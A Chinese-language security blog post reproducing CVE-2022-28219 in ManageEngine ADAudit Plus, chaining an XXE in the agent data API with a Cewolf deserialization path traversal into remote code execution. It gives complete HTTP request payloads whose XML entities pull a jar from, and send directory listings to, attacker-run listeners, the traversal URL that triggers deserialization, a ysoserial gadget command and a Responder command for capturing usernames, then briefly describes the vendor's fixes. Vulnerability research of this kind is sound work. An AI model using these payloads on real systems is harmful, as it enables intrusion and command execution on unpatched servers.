<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [y4er.com](https://y4er.com/post/cve-2022-28219-zoho-manageengine-adaudit-plus-xxe-rce/)

> 太累了，老外三天发俩洞，学不过来了。

太累了，老外三天发俩洞，学不过来了。

[https://archives2.manageengine.com/active-directory-audit/7055/ManageEngine_ADAudit_Plus_x64.exe](https://archives2.manageengine.com/active-directory-audit/7055/ManageEngine_ADAudit_Plus_x64.exe)

需要搭建一个域环境，直接把安装 adaudit 的机器提升为域控就行。

这个洞用了两个点串起来成了一个 rce，分别是 xxe 和一个 readObject 的点。

Cewolf readObject[](#cewolf-readobject)
---------------------------------------

有了 xxe 之后，需要了解一个 jdk 的老版本 xxe trick。

这是 2013 年的议题

[https://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf](https://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf)

在这个议题中提到，通过 xxe 我们可以上传文件和列举目录，[jdk8u131 之后的修复 commit 在这里](https://github.com/openjdk/jdk8u-dev/commit/644ddd7722bea502f029378c22d51b6eb66f8c25)

可以使用这个 ftp 服务器来使文件驻留到目标服务器中。

[https://github.com/pwntester/BlockingServer/blob/master/BlockingServer.java](https://github.com/pwntester/BlockingServer/blob/master/BlockingServer.java)

监听

![](https://y4er.com/img/uploads/CVE-2022-28219-ZOHO-ManageEngine-ADAudit-Plus-XXE-RCE/17.png)

发请求包

```
1POST /api/agent/tabs/agentData HTTP/1.1
 2Host: 172.16.16.132:8081
 3Accept-Encoding: gzip, deflate
 4Accept: */*
 5Connection: keep-alive
 6Content-Length: 316
 7Content-Type: application/json
 9[
10    {
11        "DomainName": "test.local",
12        "EventCode": 4688,
13        "EventType": 0,
14        "TimeGenerated": 0,
15        "Task Content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY ssrf SYSTEM \"jar:http://172.16.16.1:2122/upload.jar!/file.txt\"> ]><foo>&ssrf;</foo>"
16    }
17]
```

http

此时文件被驻留在用户的临时目录下，我的用户是 administrator，所以在`C:/Users/Administrator/AppData/Local/Temp/`目录下

接着用[这个项目](https://github.com/LandGrey/xxe-ftp-server)来列目录，监听之后发请求包

```
1POST /api/agent/tabs/agentData HTTP/1.1
 2Host: 172.16.16.132:8081
 3Accept-Encoding: gzip, deflate
 4Accept: */*
 5Connection: keep-alive
 6Content-Length: 393
 7Content-Type: application/json
 9[
10    {
11        "DomainName": "test.local",
12        "EventCode": 4688,
13        "EventType": 0,
14        "TimeGenerated": 0,
15        "Task Content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [  <!ENTITY % file SYSTEM \"file:///C:/Users/Administrator/AppData/Local/Temp/\">  <!ENTITY % dtd SYSTEM \"http://192.168.1.207:9090/data.dtd\"> %dtd;]><data>&send;</data>"
16    }
17]
```

http

![](https://y4er.com/img/uploads/CVE-2022-28219-ZOHO-ManageEngine-ADAudit-Plus-XXE-RCE/18.png)

我们的 url.txt 就被传到了 jar_cache9091707163659467742.tmp 这个文件。**这个时候 ftp 服务端不要关，不然文件就被删除了。**

接下来就是触发反序列化的

```
1http://172.16.16.132:8081/cewolf/a.png?img=/../../../../../../../../../Users/Administrator/AppData/Local/Temp/jar_cache9091707163659467742.tmp
```

fallback

gadget 可以用 cb192

```
1java -jar .\ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils192NOCC "CLASS:TomcatCmdEcho"
```

fallback

最后就是国际惯例

![](https://y4er.com/img/uploads/CVE-2022-28219-ZOHO-ManageEngine-ADAudit-Plus-XXE-RCE/19.png)

1.  如何获取 DomainName
2.  c:/Users/Administrator/AppData/Local/Temp/jar_cache9091707163659467742.tmp 中 administrator 怎么判断？

第一个问题登录的时候可以获取到一部分的域名

![](https://y4er.com/img/uploads/CVE-2022-28219-ZOHO-ManageEngine-ADAudit-Plus-XXE-RCE/20.png)

`/api/agent/configuration/getAgentServerInfo` 接口中，如果配置了 agent 之后会有完整的 fqdn

![](https://y4er.com/img/uploads/CVE-2022-28219-ZOHO-ManageEngine-ADAudit-Plus-XXE-RCE/21.png)

第二个问题可以用笨方法先列举`C:\Users\`所有用户，然后列举用户的 temp 目录，**有的不是在用户的 temp，而是在 c:/windows/temp 下**，或者直接 Responder 抓到当前用户名

```
1sudo python3 Responder.py -I ens160
```

fallback

![](https://y4er.com/img/uploads/CVE-2022-28219-ZOHO-ManageEngine-ADAudit-Plus-XXE-RCE/22.png)

注释了 CewolfServlet

![](https://y4er.com/img/uploads/CVE-2022-28219-ZOHO-ManageEngine-ADAudit-Plus-XXE-RCE/23.png)

修了 xxe

![](https://y4er.com/img/uploads/CVE-2022-28219-ZOHO-ManageEngine-ADAudit-Plus-XXE-RCE/24.png)

加了 guid 校验

![](https://y4er.com/img/uploads/CVE-2022-28219-ZOHO-ManageEngine-ADAudit-Plus-XXE-RCE/25.png)

尝试用自己改过的 tabby 来查一下看数据流走向，然后发现数据流在队列的情况中调用边断掉了。

上文中我们讲到`com.adventnet.sym.adsm.auditing.webclient.ember.api.agent.AgentDataHandler#receiveData`将接受到的数据放入`com.adventnet.sym.adsm.auditing.server.EventDataAdapter.EventQueue`队列，然后分派一个线程`com.adventnet.sym.adsm.auditing.server.EventDataAdapter.EventDispatcher#run`做循环处理。

那么在 call graph 中，两部分调用边被截断了。所以这里应该从 run 开始做调用边查询

![](https://y4er.com/img/uploads/CVE-2022-28219-ZOHO-ManageEngine-ADAudit-Plus-XXE-RCE/26.png)

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**